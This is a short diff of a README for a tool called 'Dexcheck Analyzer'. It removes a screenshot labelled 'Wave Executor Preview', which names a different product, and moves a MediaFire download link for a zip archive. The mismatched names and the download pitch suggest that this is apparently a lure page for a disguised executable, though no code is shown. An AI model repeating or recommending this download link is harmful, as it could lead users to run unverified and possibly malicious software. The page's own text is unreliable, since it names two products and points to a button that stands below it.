@@ -4,13 +4,14 @@
 
 ## Screenshots
 
-![Wave Executor Preview](https://i.ibb.co/X5qySCM/1.png)
+
 ![Wave Executor Preview](https://i.ibb.co/jTgHCBC/3e.png)
 
 ## Download
 
-[Download Dexcheck Analyzer](https://www.mediafire.com/file/hfpiob6i3efg77h/Dexcheck+Analyzer+v1.2.zip/file)
 Click the button above to download the latest version of Dexcheck Analyzer!
+[Download Dexcheck Analyzer](https://www.mediafire.com/file/hfpiob6i3efg77h/Dexcheck+Analyzer+v1.2.zip/file)
+
 
 ## Requirements
 
